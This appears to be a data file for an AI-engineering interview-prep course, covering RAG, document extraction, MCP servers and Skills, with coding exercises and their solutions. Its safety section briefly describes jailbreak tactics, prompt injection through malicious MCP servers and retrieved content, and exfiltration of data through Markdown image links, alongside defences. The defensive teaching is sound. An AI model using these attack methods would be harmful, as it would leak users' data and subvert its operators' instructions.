    { id: "q139", topic: "vectorstores", q: "Bi-encoder versus cross-encoder: why rerank?", a: "A bi-encoder embeds query and documents separately, so documents can be embedded once and searched in milliseconds, but it can't compare them closely. A cross-encoder reads query and document together and scores relevance much more accurately, but is too slow for a whole corpus. So retrieve 20-50 candidates with vectors and keywords, then rerank them, and measure the gain with recall@k or MRR." },
    { id: "q140", topic: "multimodal", q: "How would you extract tables from scanned PDFs reliably?", a: "Detect pages without a text layer and send them as images to a vision model (or a document-AI service) with a strict schema for the table. Keep page numbers, validate the numbers (rows sum to totals, dates parse), compare against a hand-labelled sample per document type, and route low-confidence pages to human review." },
    { id: "q141", topic: "multimodal", q: "Design a system that answers questions about recorded customer calls.", a: "Transcribe with timestamps and speaker labels (diarization), chunked with overlap; redact personal data; store transcript chunks with call ID, time and speaker as metadata; answer with RAG that cites call and timestamp. Evaluate transcription error on a sample, retrieval with recall@k, and answers for faithfulness. Watch costs per audio minute and retention rules." },
    { id: "q142", topic: "assistants", q: "Walk me through how you use an AI coding assistant on a real task.", a: "Explore: have it read the relevant code and explain it. Plan: get a short written plan and correct it. Code: small steps, with a failing test written from the spec first and the suite run after each step. Commit: review every line of the diff for invented APIs, edge cases, swallowed errors and security, then commit with a clear message. Give a concrete example of a mistake you caught." },
    { id: "q143", topic: "assistants", q: "How do you review code an AI assistant wrote?", a: "Like a colleague's pull request, with extra suspicion in known weak spots: functions or arguments that don't exist, edge cases (empty input, last item, None), tests generated from the implementation that bake in its bugs, broad exception handling, secrets, and changes outside the task. Run it, see the tests fail without the change, and keep diffs small enough to actually read." },
    { id: "q144", topic: "assistants", q: "An interview round allows AI tools. What is it testing?", a: "How you direct and verify the tool: clarifying the problem, breaking it down, giving good context, reading and testing what comes back, and catching its mistakes, while explaining your reasoning. It's not a typing test; prompting your way to code you can't explain or verify scores worse than slower code you understand." },
    { id: "q145", topic: "rag", q: "A user says the RAG assistant gave a wrong answer. How do you debug it?", a: "Reproduce it and look at the trace: the query, retrieved chunks with scores, the final prompt and the answer. If no chunk contained the answer, it's retrieval (chunking, embeddings, k, keyword search, filters, query rewriting). If the right chunk was there, it's generation (prompt, grounding, distracting chunks, model). Add the case to the eval set and fix the category it belongs to." },
    { id: "q146", topic: "rag", q: "How do you make sure RAG never shows users documents they aren't allowed to see?", a: "Store access groups as metadata on every chunk and filter by the user's groups inside the retrieval query, before results reach the model or the prompt. Keep permissions in sync with the source system, test with users of different roles, and never rely on instructions to the model to hide text it was given." },
  ],
  quiz: [
    { id: "x104", tags: [], topic: "vectorstores", q: "A reranker is usually applied:", options: ["To every document in the corpus", "Only to the top few dozen candidates from fast retrieval", "Before chunking", "Instead of embeddings at indexing time"], answer: 1, why: "Cross-encoder rerankers are accurate but slow, so they rescore a short candidate list." },
    { id: "x105", tags: [], topic: "rag", q: "The right chunk was retrieved but the answer is still wrong. This is:", options: ["A retrieval failure", "A generation failure", "A chunking failure", "An embedding failure"], answer: 1, why: "Retrieval did its job; the prompt, grounding or model failed to use the source." },
    { id: "x106", tags: [], topic: "assistants", q: "Tests generated by reading the implementation are risky because:", options: ["They run slowly", "They describe what the code does, bugs included", "They can't use assert", "They need an API key"], answer: 1, why: "Tests must come from the specification to catch the implementation's mistakes." },
  ],
  labs: [{
    id: "docextract", title: "Document extractor: invoices from PDFs and photos", level: "Intermediate", time: "5-8 hours", stack: ["Python", "pypdf", "Vision-capable model (API or local)", "Pydantic"],
    goal: "Extract vendor, date, line items and total from 20 invoices or receipts (text PDFs, scans and phone photos), validate the arithmetic, and report accuracy per field: the document-processing take-home in miniature.",
    before: [
      "**Cost:** images cost tokens by size. 20 documents with a few runs each is well under a dollar with a small vision model; resize images first.",
      "**Set a spending limit** in the provider's console.",
      "**Keep keys out of code and git**, and remove personal details from your own receipts before using them.",
      "**Free alternative:** a local vision model through Ollama, or text-layer PDFs only with pypdf (no model needed for the text, a local text model for the extraction).",
    ],
    steps: [
      { do: "Collect 20 documents (public sample invoices or your own receipts with personal details removed) and label the expected fields by hand",
        see: "A folder of documents and a `labels.jsonl` with vendor, date, items and total for each.",
        hint: "Mix types: text PDFs, scanned PDFs, phone photos, a multi-page invoice." },
      { do: "Read the text layer with pypdf, and detect pages that have none (scans)",
        see: "A printout per document: text found, or 'no text layer, send to vision'.",
        hint: "`page.extract_text()` returning almost nothing usually means a scan." },
      { do: "Send scans and photos to a vision model as resized image blocks, asking for the fields as JSON",
        see: "Structured JSON for every document, including the photos.",
        hint: "Your `fit_size`, `to_image_block` and `image_tokens` exercises cover resizing, the block and its cost." },
      { do: "Validate: schema, dates that parse, and line items that add up to the total to the cent",
        see: "Documents that fail a check are flagged with the reason.",
        hint: "Your `check_total` fix is the arithmetic check. A failed check is a great signal of a misread digit." },
      { do: "Evaluate per field against your labels, split by document type",
        see: "A table: rows for vendor, date, items and total; columns for text PDF, scan and photo.",
        hint: "Expect photos to be worst. That's a finding worth reporting, not hiding." },
      { do: "Do error analysis on the failures and fix the biggest category",
        see: "Before and after numbers for that category.",
        hint: "Common fixes: higher resolution for small print, a field description that explains date formats, one example in the prompt." },
      { do: "README: pipeline diagram, accuracy table, cost per document, and a privacy note on what is sent where",
        see: "A reviewer can see the design choices and the numbers in two minutes.",
        hint: "State what you'd do with more time (human review queue, confidence scores)." },
    ],
    resume: "Built a document-extraction pipeline for invoices (PDF text layer with a vision-model fallback for scans and photos) with schema and arithmetic validation, measured per field and per document type on a labelled set.",
    cost: "Under a dollar with a small vision model and resized images; free with a local model.",
    stretch: ["Process long PDFs in page batches", "Route documents that fail validation to a human review queue"],
  }],
  glossary: [
    ["Bi-encoder / cross-encoder", "A bi-encoder embeds query and document separately (fast search); a cross-encoder reads them together (accurate reranking)."],
    ["Diarization", "Labelling who spoke when in an audio recording."],
    ["IDF (inverse document frequency)", "A weight that makes words found in few documents count more in keyword search."],
    ["MRR (mean reciprocal rank)", "The average of 1 / (position of the first relevant result) across queries."],
  ],
});

// ---------------- Modules 11-14: tools, agents, MCP & Skills, safety ----------------
extendTrack(AI, {
  topics: [
    {
      id: "mcp", title: "MCP servers and Skills", short: "MCP",
      why: "MCP is how agents connect to real systems (databases, ticketing, documents) without custom glue for every app, and it appears in about one in seven AI Engineer postings. Skills package a team's know-how so agents use it the same way every time.",
      body: `<p>Every AI app needs the same integrations: the ticket system, the database, the docs. Writing custom tool code for each app and each system doesn't scale. The <b>Model Context Protocol (MCP)</b> is an open standard that fixes this: a system is wrapped once as an <b>MCP server</b>, and any <b>MCP host</b> (Claude Code, Claude Desktop, IDEs, your own agent) can use it through its built-in <b>MCP client</b>.</p>
        <h3>What a server offers</h3>
        <ul><li><b>Tools:</b> functions the model can call, exactly like <button class="link-btn inline-link" data-trgo="ai|learn|tools">tool use</button> (search tickets, create a draft).</li>
        <li><b>Resources:</b> read-only data the host can load into context, each identified by a URI (a file, a database schema).</li>
        <li><b>Prompts:</b> reusable prompt templates a user can pick from a menu.</li></ul>
        <h3>The protocol</h3>
        <p>Messages are <b>JSON-RPC 2.0</b>: a small standard for calling functions with JSON. A request has <code>"jsonrpc": "2.0"</code>, an <code>id</code>, a <code>method</code> and <code>params</code>; the response carries the same id and either a <code>result</code> or an <code>error</code> (a numeric code and a message, such as -32601 for "method not found"). A message without an id is a <b>notification</b>: no response is sent.</p>
        <ol><li>The client sends <code>initialize</code> with its protocol version and capabilities; the server answers with its own; the client confirms with the notification <code>notifications/initialized</code>.</li>
        <li><code>tools/list</code> returns each tool's name, description and <code>inputSchema</code> (a JSON schema).</li>
        <li><code>tools/call</code> with a name and arguments returns <code>content</code> blocks (such as <code>{"type": "text", "text": "..."}</code>). If the tool itself fails, the server still returns a result, with <code>isError: true</code>, so the model can read the error and recover; protocol-level errors (unknown method, unknown tool) use JSON-RPC errors.</li></ol>
        <p>Two <b>transports</b> carry the messages: <b>stdio</b>, where the host starts the server as a local program and they talk through its standard input and output (one JSON message per line), and <b>Streamable HTTP</b> for remote servers, which need authentication. With stdio, anything the server prints to standard output is read as protocol, so logs must go to standard error.</p>
        <h3>Building one</h3>
        <p>The official Python SDK turns ordinary functions into tools: type hints become the input schema and the docstring becomes the description, so write it for the model (see the code sample below). Test it without any model using the MCP Inspector, then register it with a host.</p>
        <h3>Security</h3>
        <p>A local MCP server runs with your permissions, and tool descriptions and results are text the model reads, so a malicious or compromised server can inject instructions. Install servers you trust and pin their versions (a supply-chain risk), give each one least privilege, and keep human approval for tools that write or send.</p>
        <h3>Skills</h3>
        <p>A <b>skill</b> is a folder of instructions an agent loads when a task needs it: a <code>SKILL.md</code> file that starts with <b>frontmatter</b> (a <code>---</code> fenced header with a <code>name</code> and a <code>description</code>), followed by the instructions in Markdown, plus optional scripts and reference files. Skills use <b>progressive disclosure</b>: the agent starts with only each skill's name and description, reads the full SKILL.md when a task matches, and opens extra files only if the instructions point to them. So you can install many skills without filling the context window, and the <b>description decides when a skill is used</b>.</p>
        <p>MCP connects an agent to systems; a skill teaches it a procedure (how your team writes release notes, how to query the warehouse safely). They combine well: a skill can explain how to use an MCP server's tools for your team's tasks.</p>`,
      example: `import json

# One request/response round of MCP's JSON-RPC, handled in-process
request = {"jsonrpc": "2.0", "id": 2, "method": "tools/call",
           "params": {"name": "application_status", "arguments": {"company": "Shopify"}}}

def application_status(company):
    return {"Shopify": "Interview on Friday"}.get(company, "No application found")

result = application_status(**request["params"]["arguments"])
response = {"jsonrpc": "2.0", "id": request["id"],
            "result": {"content": [{"type": "text", "text": result}], "isError": False}}
print(json.dumps(response))      # one line on standard output, for the client

skill = "---" + chr(10) + "name: release-notes" + chr(10) + "description: Write release notes from merged PRs. Use when asked for release notes." + chr(10) + "---" + chr(10) + "1. List merged PRs..."
print(skill.split(chr(10))[1:3])  # all the agent sees until a task matches
`,
      code: [{ label: "A minimal MCP server with the official Python SDK (pip install \"mcp[cli]\")", code: `from mcp.server.fastmcp import FastMCP

mcp = FastMCP("applications")

APPLICATIONS = {"Shopify": "Interview on Friday", "Clio": "Applied, no reply yet"}

@mcp.tool()
def application_status(company: str) -> str:
    """Look up the status of one of my job applications by company name, e.g. 'Shopify'."""
    if company not in APPLICATIONS:
        raise ValueError(f"No application for {company!r}. Known companies: {', '.join(APPLICATIONS)}")
    return APPLICATIONS[company]

if __name__ == "__main__":
    mcp.run()        # stdio transport by default

# Try it without a model:   mcp dev server.py        (opens the MCP Inspector)
# Use it from Claude Code:  claude mcp add applications -- python server.py` }],
      exercises: [{
        key: "jsonrpc", prompt: "Write make_response(request, result=None, error=None) for JSON-RPC 2.0. For a notification (a request without an \"id\"), return None: notifications get no reply. Otherwise return {\"jsonrpc\": \"2.0\", \"id\": the request's id} plus either \"error\" (when error is given, as {\"code\": ..., \"message\": ...}) or \"result\".",
        example: `make_response({"jsonrpc": "2.0", "id": 7, "method": "tools/list"}, result={"tools": []})\nreturns {"jsonrpc": "2.0", "id": 7, "result": {"tools": []}}`,
        hint: "`if \"id\" not in request: return None`. Build the base dict, then add `\"error\"` if `error is not None`, else `\"result\"`.",
        starter: `def make_response(request, result=None, error=None):
    pass
`,
        tests: `assert make_response({"jsonrpc": "2.0", "id": 7, "method": "tools/list"}, result={"tools": []}) == {"jsonrpc": "2.0", "id": 7, "result": {"tools": []}}
assert make_response({"jsonrpc": "2.0", "id": "a1", "method": "nope"}, error={"code": -32601, "message": "Method not found"}) == {"jsonrpc": "2.0", "id": "a1", "error": {"code": -32601, "message": "Method not found"}}
assert make_response({"jsonrpc": "2.0", "method": "notifications/initialized"}) is None, "notifications get no reply"
assert make_response({"jsonrpc": "2.0", "id": 0, "method": "ping"}, result={}) == {"jsonrpc": "2.0", "id": 0, "result": {}}, "id 0 is still an id"`,
        solution: `def make_response(request, result=None, error=None):
    if "id" not in request:
        return None
    response = {"jsonrpc": "2.0", "id": request["id"]}
    if error is not None:
        response["error"] = error
    else:
        response["result"] = result
    return response`,
      }, {
        key: "mcp-server", prompt: "Write handle(request, tools), a tiny MCP server. tools maps a name to {\"description\", \"params\" (a dict of parameter name to JSON type), \"fn\"}. Requests without an id are notifications: return None. Methods: \"initialize\" returns a result with the client's protocolVersion (from params), capabilities {\"tools\": {}} and serverInfo {\"name\": \"applications\", \"version\": \"1.0\"}. \"tools/list\" returns {\"tools\": [...]} with name, description and inputSchema (type object, properties with each param's type, all params required). \"tools/call\" runs fn(**arguments) and returns {\"content\": [{\"type\": \"text\", \"text\": str(result)}], \"isError\": False}; if fn raises, the same shape with the error text and isError True. An unknown tool is a JSON-RPC error with code -32602; an unknown method, code -32601.",
        example: `handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call",\n        "params": {"name": "status", "arguments": {"company": "Shopify"}}}, tools)\nreturns {"jsonrpc": "2.0", "id": 1, "result": {"content": [{"type": "text", "text": "Interview on Friday"}], "isError": False}}`,
        hint: "Write a helper `reply(result=None, error=None)` that builds the response dict with the request's id. Then branch on `request[\"method\"]`. Put the tool call in `try:` / `except Exception as e:` so a failing tool becomes a result with isError True, not a crash.",
        starter: `def handle(request, tools):
    pass
`,
        tests: `def status(company):
    data = {"Shopify": "Interview on Friday"}
    if company not in data:
        raise ValueError("no application for " + company)
    return data[company]
tools = {"status": {"description": "Application status by company.", "params": {"company": "string"}, "fn": status}}
r = handle({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {}}}, tools)
assert r["id"] == 1 and r["result"]["protocolVersion"] == "2025-06-18" and "tools" in r["result"]["capabilities"], r
assert handle({"jsonrpc": "2.0", "method": "notifications/initialized"}, tools) is None
r = handle({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, tools)
assert r["result"]["tools"] == [{"name": "status", "description": "Application status by company.", "inputSchema": {"type": "object", "properties": {"company": {"type": "string"}}, "required": ["company"]}}], r
r = handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "status", "arguments": {"company": "Shopify"}}}, tools)
assert r == {"jsonrpc": "2.0", "id": 3, "result": {"content": [{"type": "text", "text": "Interview on Friday"}], "isError": False}}, r
r = handle({"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "status", "arguments": {"company": "Shopfy"}}}, tools)
assert r["result"]["isError"] is True and "Shopfy" in r["result"]["content"][0]["text"], "a failing tool is a result the model can read"
r = handle({"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "delete_all", "arguments": {}}}, tools)
assert r["error"]["code"] == -32602 and "result" not in r
r = handle({"jsonrpc": "2.0", "id": 6, "method": "resources/subscribe", "params": {}}, tools)
assert r["error"]["code"] == -32601`,
        solution: `def handle(request, tools):
    if "id" not in request:
        return None
    def reply(result=None, error=None):
        response = {"jsonrpc": "2.0", "id": request["id"]}
        if error is not None:
            response["error"] = error
        else:
            response["result"] = result
        return response
    method = request["method"]
    params = request.get("params", {})
    if method == "initialize":
        return reply({"protocolVersion": params["protocolVersion"], "capabilities": {"tools": {}},
                      "serverInfo": {"name": "applications", "version": "1.0"}})
    if method == "tools/list":
        listed = []
        for name, t in tools.items():
            props = {p: {"type": kind} for p, kind in t["params"].items()}
            listed.append({"name": name, "description": t["description"],
                           "inputSchema": {"type": "object", "properties": props, "required": list(t["params"])}})
        return reply({"tools": listed})
    if method == "tools/call":
        name = params["name"]
        if name not in tools:
            return reply(error={"code": -32602, "message": "Unknown tool: " + name})
        try:
            text, failed = str(tools[name]["fn"](**params.get("arguments", {}))), False
        except Exception as e:
            text, failed = str(e), True
        return reply({"content": [{"type": "text", "text": text}], "isError": failed})
    return reply(error={"code": -32601, "message": "Method not found: " + method})`,
      }, {
        key: "skill-parse", prompt: "Write parse_skill(text) for a SKILL.md file: the first line is ---, then lines of \"key: value\" until the next --- line, then the Markdown body. Return (meta, body): meta is a dict of the header (keys and values stripped; split each line at the first colon), body is the rest with surrounding whitespace stripped. Raise ValueError if the file doesn't start with a --- header, the header is never closed, or name or description is missing.",
        example: `parse_skill("---" + NL + "name: release-notes" + NL + "description: Write release notes. Use when asked." + NL + "---" + NL + "1. List merged PRs.")\nreturns ({"name": "release-notes", "description": "Write release notes. Use when asked."}, "1. List merged PRs.")`,
        hint: "`lines = text.split(chr(10))`. Check `lines[0].strip() == \"---\"`, then find the closing line with a loop from index 1. Header lines become dict entries with `line.split(\":\", 1)`; the body is `chr(10).join(lines[end + 1:]).strip()`.",
        starter: `def parse_skill(text):
    pass
`,
        tests: `NL = chr(10)
text = "---" + NL + "name: release-notes" + NL + "description: Write release notes from merged PRs. Use when asked for release notes." + NL + "---" + NL + NL + "# Release notes" + NL + "1. List merged PRs: see reference.md" + NL
meta, body = parse_skill(text)
assert meta == {"name": "release-notes", "description": "Write release notes from merged PRs. Use when asked for release notes."}, meta
assert body == "# Release notes" + NL + "1. List merged PRs: see reference.md", repr(body)
for bad in ["# no header", "---" + NL + "name: x" + NL + "description: y", "---" + NL + "name: x" + NL + "---" + NL + "body"]:
    try:
        parse_skill(bad); raise SystemExit("expected ValueError for " + repr(bad))
    except ValueError:
        pass`,
        solution: `def parse_skill(text):
    lines = text.split(chr(10))
    if not lines or lines[0].strip() != "---":
        raise ValueError("SKILL.md must start with a --- header")
    end = None
    for i in range(1, len(lines)):
        if lines[i].strip() == "---":
            end = i
            break
    if end is None:
        raise ValueError("the --- header is never closed")
    meta = {}
    for line in lines[1:end]:
        if ":" in line:
            key, value = line.split(":", 1)
            meta[key.strip()] = value.strip()
    for key in ["name", "description"]:
        if not meta.get(key):
            raise ValueError("missing " + key)
    return meta, chr(10).join(lines[end + 1:]).strip()`,
      }, {
        key: "skill-match", prompt: "Progressive disclosure in miniature: an agent decides which skills to load from their descriptions alone. Write matching_skills(skills, task): skills is a list of {\"name\", \"description\"}. A word is the lowercased text split on spaces, with . , ! ? stripped, keeping only words of 4 or more letters. Return the names of skills whose description shares at least 2 distinct words with the task, in list order.",
        example: `skills = [{"name": "release-notes", "description": "Write release notes from merged pull requests."},\n          {"name": "sql-safety", "description": "Query the warehouse safely with read-only SQL."}]\nmatching_skills(skills, "Write the release notes for this sprint") returns ["release-notes"]`,
        hint: "Helper: `{w.strip(\".,!?\") for w in text.lower().split() if len(w.strip(\".,!?\")) >= 4}` gives a set of words. Two sets' common words are `a & b`.",
        starter: `def matching_skills(skills, task):
    pass
`,
        tests: `skills = [{"name": "release-notes", "description": "Write release notes from merged pull requests."},
          {"name": "sql-safety", "description": "Query the warehouse safely with read-only SQL. Use for any warehouse query."},
          {"name": "vague", "description": "Does things."}]
assert matching_skills(skills, "Write the release notes for this sprint") == ["release-notes"]
assert matching_skills(skills, "How many signups last week? Query the warehouse.") == ["sql-safety"]
assert matching_skills(skills, "Help me with some things") == [], "a vague description rarely matches: descriptions decide when a skill loads"`,
        solution: `def words(text):
    return {w.strip(".,!?") for w in text.lower().split() if len(w.strip(".,!?")) >= 4}

def matching_skills(skills, task):
    task_words = words(task)
    return [s["name"] for s in skills if len(words(s["description"]) & task_words) >= 2]`,
      }, {
        key: "stdio-debug", debug: true, prompt: "This stdio MCP server works when you call handle() directly, but every MCP host fails to connect to it: the client reads the server's standard output as protocol messages, and the server writes its debug log there too. Fix serve so out (standing in for standard output) receives only JSON-RPC responses, and log lines go to log (standard error).",
        example: `serve(['{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}'], out, log, handle)\nout: ['{"jsonrpc": "2.0", "id": 1, "result": {"tools": []}}']\nlog: ["handling tools/list"]`,
        hint: "Find every line appended to out and ask: is this a protocol message? The log line belongs in log.",
        starter: `import json

def serve(request_lines, out, log, handle):
    # stdio transport: one JSON-RPC message per line in, one per line out
    for line in request_lines:
        request = json.loads(line)
        out.append("handling " + request.get("method", "?"))
        response = handle(request)
        if response is not None:
            out.append(json.dumps(response))
`,
        tests: `import json
def handle(request):
    if "id" not in request:
        return None
    return {"jsonrpc": "2.0", "id": request["id"], "result": {"tools": []}}
out, log = [], []
lines = ['{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}', '{"jsonrpc": "2.0", "method": "notifications/initialized"}', '{"jsonrpc": "2.0", "id": 2, "method": "tools/list"}']
serve(lines, out, log, handle)
for line in out:
    try:
        assert json.loads(line)["jsonrpc"] == "2.0"
    except ValueError:
        raise SystemExit("standard output must carry only JSON-RPC messages, found: " + line)
assert len(out) == 2, "two requests with ids, two responses (the notification gets none)"
assert "handling tools/list" in log, "keep the log, on standard error"`,
        solution: `import json

def serve(request_lines, out, log, handle):
    # stdio transport: one JSON-RPC message per line in, one per line out
    for line in request_lines:
        request = json.loads(line)
        log.append("handling " + request.get("method", "?"))
        response = handle(request)
        if response is not None:
            out.append(json.dumps(response))`,
      }],
      cards: [
        ["Tools, resources and prompts: what does each MCP primitive do?", "Tools are functions the model calls; resources are read-only data the host loads into context, identified by URIs; prompts are reusable templates a user picks."],
        ["A tool fails inside an MCP server. Error or result?", "A result with isError true and a readable message, so the model can recover. JSON-RPC errors are for protocol problems such as an unknown method or tool."],
        ["What is progressive disclosure in skills?", "The agent sees only each skill's name and description at first, reads the full SKILL.md when a task matches, and opens extra files only when needed."],
      ],
      videos: [IBM("eur8dUO9mvE", "What is MCP? Integrate AI Agents with Databases & APIs"), IBM("EyYJI8TPIj8", "How to Build an MCP Server for LLM Agents: Simplify AI Integration"), IBM("7j1t3UZA1TY", "MCP vs API: Simplifying AI Agent Integration with External Data")],
    },
  ],
  why: {
    tools: "Tool calling is how a model acts: search, query a database, file a ticket. Agent skills appear in more than half of AI Engineer postings, and every agent is built on this loop.",
    agents: "Agents are the fastest-growing requirement in postings, and live debugging rounds often hand you one that loops forever. Knowing when not to build an agent matters as much as building one.",
    safety: "Prompt injection is the top risk in the OWASP Top 10 for LLM applications, and an agent with tools turns a bad prompt into a real action. Security questions come up in almost every system design round.",
  },
  append: {
    agents: `<h3>Planning, memory and subagents</h3>
      <ul><li><b>Planning:</b> for long tasks, have the agent write a short plan first, then execute and revise it. A visible plan is also something a human can approve or correct.</li>
      <li><b>Memory:</b> short-term memory is the context window. Long-running agents need more: notes or a to-do file the agent updates, facts saved to a store and retrieved later, and <b>compaction</b>, replacing old turns with a summary while keeping the task and the latest steps.</li>
      <li><b>Subagents:</b> an orchestrator hands a self-contained subtask (research one topic, review one file) to a fresh agent with its own clean context and only the tools it needs; it gets back a short summary. This keeps the main context focused and lets independent subtasks run in parallel, at the cost of more tokens.</li></ul>
      <h3>Human approval</h3>
      <p>Sort tools by risk: read-only tools run automatically; tools that write, send, pay or delete wait for a person, who sees exactly what will happen (the email text, the rows to change). Record every approval and denial in the trace.</p>
      <h3>Debugging an agent that loops</h3>
      <p>Read the trace step by step. The usual causes: a tool error that never reaches the model (it retries the same call forever), a vague error it can't act on, a missing tool for what it needs, or no clear stop condition. Fixes: return actionable error results, detect repeated identical calls, and cap steps, time and spend per task.</p>`,
    safety: `<h3>The OWASP Top 10 for LLM applications (2025)</h3>
      <ol><li><b>Prompt injection:</b> instructions hidden in input or retrieved content.</li>
      <li><b>Sensitive information disclosure:</b> the model reveals personal data or secrets from its context.</li>
      <li><b>Supply chain:</b> compromised models, packages, plugins or MCP servers.</li>
      <li><b>Data and model poisoning:</b> tampered training, fine-tuning or RAG data.</li>
      <li><b>Improper output handling:</b> model output used unchecked in HTML, SQL or shell commands.</li>
      <li><b>Excessive agency:</b> tools with more permission or autonomy than the task needs.</li>
      <li><b>System prompt leakage:</b> assume your system prompt can be extracted; never put secrets in it.</li>
      <li><b>Vector and embedding weaknesses:</b> retrieval that ignores permissions, or poisoned documents in the index.</li>
      <li><b>Misinformation:</b> confident, wrong output that people act on.</li>
      <li><b>Unbounded consumption:</b> requests or loops that run up cost or deny service; rate limits and budgets stop them.</li></ol>
      <h3>Jailbreaks, red-teaming and output handling</h3>
      <p>A <b>jailbreak</b> is a user trying to talk the model out of its safety rules (role-play, encodings, "for a novel..."); <b>prompt injection</b> is an attacker's text in data taking over your app's instructions. <b>Red-teaming</b> means attacking your own system with a set of such attacks before launch and on every change, and tracking the <b>attack success rate</b> like any other eval. Treat model output as untrusted: escape it before showing it as HTML, never pass it to eval or a shell, use parameterized SQL, and allowlist the domains of links and images it may render, because a Markdown image URL can carry stolen data to an attacker's server. A <b>canary</b> (a unique random string placed in the system prompt) shows up in output if the prompt leaks.</p>`,
  },
  exercises: {
    tools: [{
      key: "parallel-results", prompt: "The model asked for several tools at once. Write tool_results_message(calls, registry): calls is a list of {\"id\", \"name\", \"input\"}; registry maps names to functions. Run every call and return ONE user message: {\"role\": \"user\", \"content\": [one tool_result per call, in order]}. Each tool_result is {\"type\": \"tool_result\", \"tool_use_id\": id, \"content\": str(result)}; a failing call (an exception or an unknown tool) gets the error text as content and \"is_error\": True, and the other calls still run.",
      example: `tool_results_message([{"id": "t1", "name": "add", "input": {"a": 1, "b": 2}},\n                      {"id": "t2", "name": "nope", "input": {}}], {"add": lambda a, b: a + b})\nreturns {"role": "user", "content": [\n  {"type": "tool_result", "tool_use_id": "t1", "content": "3"},\n  {"type": "tool_result", "tool_use_id": "t2", "content": "unknown tool: nope", "is_error": True}]}`,
      hint: "Loop over the calls and build each block inside `try:`; raise a ValueError yourself for an unknown name so one `except Exception as e:` handles both failures.",
      starter: `def tool_results_message(calls, registry):
    pass
`,
      tests: `reg = {"add": lambda a, b: a + b, "boom": lambda: 1 / 0}
m = tool_results_message([{"id": "t1", "name": "add", "input": {"a": 1, "b": 2}}, {"id": "t2", "name": "boom", "input": {}}, {"id": "t3", "name": "nope", "input": {}}], reg)
assert m["role"] == "user" and len(m["content"]) == 3, "all results go back together in one message"
assert m["content"][0] == {"type": "tool_result", "tool_use_id": "t1", "content": "3"}
assert m["content"][1]["is_error"] is True and m["content"][1]["tool_use_id"] == "t2"
assert m["content"][2]["is_error"] is True and "nope" in m["content"][2]["content"]
assert tool_results_message([], reg) == {"role": "user", "content": []}`,
      solution: `def tool_results_message(calls, registry):
    blocks = []
    for call in calls:
        try:
            if call["name"] not in registry:
                raise ValueError("unknown tool: " + call["name"])
            result = registry[call["name"]](**call["input"])
            blocks.append({"type": "tool_result", "tool_use_id": call["id"], "content": str(result)})
        except Exception as e:
            blocks.append({"type": "tool_result", "tool_use_id": call["id"], "content": str(e), "is_error": True})
    return {"role": "user", "content": blocks}`,
    }, {
      key: "tool-loop", prompt: "Write the real tool loop. run_tool_loop(model, registry, question, max_turns=5): model(messages) returns {\"stop_reason\", \"content\"} where content is a list of blocks. Start with one user message. If stop_reason is \"tool_use\", append {\"role\": \"assistant\", \"content\": content}, run every tool_use block (id, name, input) and append one user message with all the tool_result blocks. Otherwise return the text of the first block whose type is \"text\". Raise RuntimeError after max_turns model calls without a final answer.",
      example: "A model that calls get_status on its first turn and answers on its second:\nrun_tool_loop(model, {\"get_status\": ...}, \"Where am I with Shopify?\") returns \"You have an interview on Friday.\"",
      hint: "`for turn in range(max_turns):` call the model; on a final answer return `next(b[\"text\"] for b in reply[\"content\"] if b[\"type\"] == \"text\")`. For tool use, build results like the last exercise (each tool_result needs the block's id as tool_use_id).",
      starter: `def run_tool_loop(model, registry, question, max_turns=5):
    pass
`,
      tests: `def model(messages):
    last = messages[-1]
    if last["role"] == "user" and isinstance(last["content"], str):
        return {"stop_reason": "tool_use", "content": [{"type": "text", "text": "Checking."}, {"type": "tool_use", "id": "t1", "name": "get_status", "input": {"company": "Shopify"}}]}
    assert messages[-2]["role"] == "assistant", "the assistant's tool_use turn must come before the results"
    result = last["content"][0]
    assert result["type"] == "tool_result" and result["tool_use_id"] == "t1"
    return {"stop_reason": "end_turn", "content": [{"type": "text", "text": "You have an " + result["content"] + "."}]}
reg = {"get_status": lambda company: "interview on Friday"}
assert run_tool_loop(model, reg, "Where am I with Shopify?") == "You have an interview on Friday."
forever = lambda messages: {"stop_reason": "tool_use", "content": [{"type": "tool_use", "id": "x", "name": "get_status", "input": {"company": "A"}}]}
try:
    run_tool_loop(forever, reg, "go", max_turns=3); raise SystemExit("expected RuntimeError")
except RuntimeError:
    pass`,
      solution: `def run_tool_loop(model, registry, question, max_turns=5):
    messages = [{"role": "user", "content": question}]
    for turn in range(max_turns):
        reply = model(messages)
        if reply["stop_reason"] != "tool_use":
            return next(b["text"] for b in reply["content"] if b["type"] == "text")
        messages.append({"role": "assistant", "content": reply["content"]})
        results = []
        for block in reply["content"]:
            if block["type"] != "tool_use":
                continue
            try:
                out = registry[block["name"]](**block["input"])
                results.append({"type": "tool_result", "tool_use_id": block["id"], "content": str(out)})
            except Exception as e:
                results.append({"type": "tool_result", "tool_use_id": block["id"], "content": str(e), "is_error": True})
        messages.append({"role": "user", "content": results})
    raise RuntimeError("no final answer after " + str(max_turns) + " turns")`,
    }, {
      key: "history-debug", debug: true, prompt: "After the first tool call, every request fails with an API error saying a tool_result has no matching tool_use. next_messages builds the history for the next request, and it forgets something: each tool_result must answer a tool_use block in the assistant message right before it. Fix it.",
      example: `next_messages([user_msg], response, results) returns\n[user_msg, {"role": "assistant", "content": response["content"]}, {"role": "user", "content": results}]`,
      hint: "The model's own turn (with its tool_use blocks) has to go into the history before your results.",
      starter: `def next_messages(messages, response, results):
    # response: the model's reply containing tool_use blocks
    # results: the tool_result blocks your code produced for them
    return messages + [{"role": "user", "content": results}]
`,
      tests: `def valid(history):
    for i, m in enumerate(history):
        if m["role"] == "user" and isinstance(m["content"], list):
            prev = history[i - 1] if i > 0 else {"role": None, "content": []}
            ids = {b["id"] for b in prev["content"] if isinstance(prev["content"], list) and b.get("type") == "tool_use"} if prev["role"] == "assistant" else set()
            for b in m["content"]:
                if b.get("type") == "tool_result" and b["tool_use_id"] not in ids:
                    return False
    return True
first = [{"role": "user", "content": "Where am I with Shopify?"}]
response = {"stop_reason": "tool_use", "content": [{"type": "tool_use", "id": "t1", "name": "get_status", "input": {"company": "Shopify"}}]}
